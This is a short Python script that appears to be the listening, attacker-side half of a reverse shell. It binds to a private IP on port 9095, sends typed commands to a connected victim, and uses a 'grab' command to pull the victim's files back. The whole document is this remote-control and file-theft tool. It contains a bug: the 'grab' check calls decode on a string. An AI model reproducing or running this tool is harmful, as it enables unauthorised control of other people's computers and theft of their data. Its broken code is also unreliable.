import socket
import subprocess
import os

def transfer(conn, command):
    conn.send(command.encode())
    f = open ('File address','wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # write whose last recev
            f.close()
            print('[+] Transfer Completed')
            break
        elif 'File bot found'.encode() in bits:
            print('[-] Unable to find out the file!')
            break
        f.write(bits)


def connecting():
    s = socket.socket()
    s.bind(("192.168.0.152", 9095))
    s.listen(1)
    print('[+] Listening for income TCP Connection on port9095')
    conn,addr = s.accept()
    print('[+] We got a Connection from ', addr)
    while True:
        command = input("Shell> ")

        if 'terminate' in command :
            conn.send('terminate'.encode())
            break
        elif 'grab' in command.decode():
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    connecting()
main()
